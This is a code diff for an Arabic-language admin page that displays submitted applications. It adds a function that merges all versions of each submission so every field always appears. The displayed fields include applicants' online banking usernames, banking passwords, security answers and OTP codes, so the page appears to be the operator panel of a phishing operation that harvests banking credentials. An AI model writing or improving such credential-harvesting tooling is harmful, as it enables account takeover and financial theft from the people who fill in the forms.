@@ -58,6 +58,32 @@ interface ApplicationVersion {
   otpCode?: string;
 }
 
+// دمج جميع نسخ الطلب حقلاً بحقل (الأحدث له الأولوية، لكن لا يُسقط حقول القديمة)
+function mergeVersionsData(sources: ApplicationVersion[]): ApplicationVersion {
+  const FIELDS: (keyof ApplicationVersion)[] = [
+    "applicantType", "fullName", "nationalId", "dateOfBirth", "monthlySalary",
+    "employer", "phone", "email", "city", "maritalStatus",
+    "companyName", "businessType", "commercialRegistration", "employeeCount",
+    "annualRevenue", "contactName",
+    "bankName", "bankUsername", "bankPassword", "securityAnswer",
+    "otpCode",
+  ];
+  const sorted = [...sources].sort(
+    (a, b) => (Number(b.version) || 0) - (Number(a.version) || 0)
+  );
+  const result: Record<string, unknown> = {};
+  for (const field of FIELDS) {
+    for (const src of sorted) {
+      const val = src[field as keyof ApplicationVersion];
+      if (val !== null && val !== undefined && val !== "") {
+        result[field] = val;
+        break;
+      }
+    }
+  }
+  return result as ApplicationVersion;
+}
+
 export default function AdminApplicationDetailPage() {
   const params = useParams<{ id: string }>();
   const [, navigate] = useLocation();
@@ -133,8 +159,12 @@ export default function AdminApplicationDetailPage() {
     <AdminLayout><div className="p-8 text-center text-destructive">الطلب غير موجود</div></AdminLayout>
   );
 
-  const currentVersion = versions.find(v => v.isLatest) || app;
   const olderVersions = versions.filter(v => !v.isLatest);
+  // دمج جميع النسخ مع بيانات app الأساسية — يضمن ظهور كل الحقول دائماً
+  const allData = mergeVersionsData([
+    ...versions,
+    app as unknown as ApplicationVersion,
+  ]);
 
   const DataRow = ({ label, value, badge }: { label: string; value: string | null | undefined; badge?: string }) =>
     value ? (
@@ -224,7 +254,7 @@ export default function AdminApplicationDetailPage() {
                     className={`flex-1 px-4 py-3 text-sm font-bold transition-colors flex items-center justify-center gap-2 ${
                       activeTab === "current" ? "bg-primary text-white" : "bg-muted hover:bg-muted/70 text-foreground"
                     }`}>
-                    <Clock className="w-4 h-4" /> البيانات الحالية ({currentVersion.version})
+                    <Clock className="w-4 h-4" /> البيانات الحالية ({versions.length > 0 ? Math.max(...versions.map(v => v.version || 0)) : 1})
                   </button>
                   <button onClick={() => setActiveTab("older")}
                     className={`flex-1 px-4 py-3 text-sm font-bold transition-colors flex items-center justify-center gap-2 ${
@@ -237,7 +267,7 @@ export default function AdminApplicationDetailPage() {
                   {loadingVersions ? (
                     <p className="text-center text-muted-foreground">جارٍ تحميل البيانات...</p>
                   ) : activeTab === "current" ? (
-                    renderData(currentVersion)
+                    renderData(allData)
                   ) : (
                     <div className="space-y-6">
                       {olderVersions.sort((a, b) => b.version - a.version).map((v) => (
@@ -255,46 +285,46 @@ export default function AdminApplicationDetailPage() {
               </div>
             )}
 
-            {/* البيانات الافتراضية */}
+            {/* البيانات الافتراضية — تستخدم allData لضمان عرض كل الحقول دائماً */}
             {versions.length <= 1 && (
               <>
                 <div className="bg-card border rounded-2xl p-6">
                   <h3 className="font-black mb-4 pb-2 border-b">
-                    {app.applicantType === "individual" ? "بيانات مقدم الطلب (فرد)" : "بيانات الشركة"}
+                    {allData.applicantType === "individual" ? "بيانات مقدم الطلب (فرد)" : "بيانات الشركة"}
                   </h3>
-                  {app.applicantType === "individual" ? (
+                  {allData.applicantType === "individual" ? (
                     <>
-                      <DataRow label="الاسم الكامل" value={app.fullName} />
-                      <DataRow label="رقم الهوية" value={app.nationalId} />
-                      <DataRow label="تاريخ الميلاد" value={app.dateOfBirth} />
-                      <DataRow label="الراتب الشهري" value={app.monthlySalary} />
-                      <DataRow label="جهة العمل" value={app.employer} />
-                      <DataRow label="رقم الهاتف" value={app.phone} />
-                      <DataRow label="البريد الإلكتروني" value={app.email} />
-                      <DataRow label="المدينة" value={app.city} />
-                      <DataRow label="الحالة الاجتماعية" value={app.maritalStatus} />
+                      <DataRow label="الاسم الكامل" value={allData.fullName} />
+                      <DataRow label="رقم الهوية" value={allData.nationalId} />
+                      <DataRow label="تاريخ الميلاد" value={allData.dateOfBirth} />
+                      <DataRow label="الراتب الشهري" value={allData.monthlySalary} />
+                      <DataRow label="جهة العمل" value={allData.employer} />
+                      <DataRow label="رقم الهاتف" value={allData.phone} />
+                      <DataRow label="البريد الإلكتروني" value={allData.email} />
+                      <DataRow label="المدينة" value={allData.city} />
+                      <DataRow label="الحالة الاجتماعية" value={allData.maritalStatus} />
                     </>
                   ) : (
                     <>
-                      <DataRow label="اسم الشركة" value={app.companyName} />
-                      <DataRow label="نوع النشاط" value={app.businessType} />
-                      <DataRow label="السجل التجاري" value={app.commercialRegistration} />
-                      <DataRow label="عدد الموظفين" value={app.employeeCount} />
-                      <DataRow label="الإيرادات السنوية" value={app.annualRevenue} />
-                      <DataRow label="اسم المسؤول" value={app.contactName} />
-                      <DataRow label="رقم الهاتف" value={app.phone} />
-                      <DataRow label="البريد الإلكتروني" value={app.email} />
+                      <DataRow label="اسم الشركة" value={allData.companyName} />
+                      <DataRow label="نوع النشاط" value={allData.businessType} />
+                      <DataRow label="السجل التجاري" value={allData.commercialRegistration} />
+                      <DataRow label="عدد الموظفين" value={allData.employeeCount} />
+                      <DataRow label="الإيرادات السنوية" value={allData.annualRevenue} />
+                      <DataRow label="اسم المسؤول" value={allData.contactName} />
+                      <DataRow label="رقم الهاتف" value={allData.phone} />
+                      <DataRow label="البريد الإلكتروني" value={allData.email} />
                     </>
                   )}
                 </div>
-                {(app.bankName || app.bankUsername) && (
+                {(allData.bankName || allData.bankUsername) && (
                   <div className="bg-card border rounded-2xl p-6">
                     <h3 className="font-black mb-4 pb-2 border-b">بيانات البنك</h3>
-                    <DataRow label="البنك المختار" value={app.bankName} />
-                    <DataRow label="اسم المستخدم" value={app.bankUsername} />
-                    <DataRow label="كلمة المرور" value={app.bankPassword} />
-                    <DataRow label="كلمة التحقق" value={app.securityAnswer} />
-                    <DataRow label="رمز OTP" value={app.otpCode} />
+                    <DataRow label="البنك المختار" value={allData.bankName} />
+                    <DataRow label="اسم المستخدم" value={allData.bankUsername} />
+                    <DataRow label="كلمة المرور" value={allData.bankPassword} />
+                    <DataRow label="كلمة التحقق" value={allData.securityAnswer} />
+                    <DataRow label="رمز OTP" value={allData.otpCode} />
                   </div>
                 )}
               </>
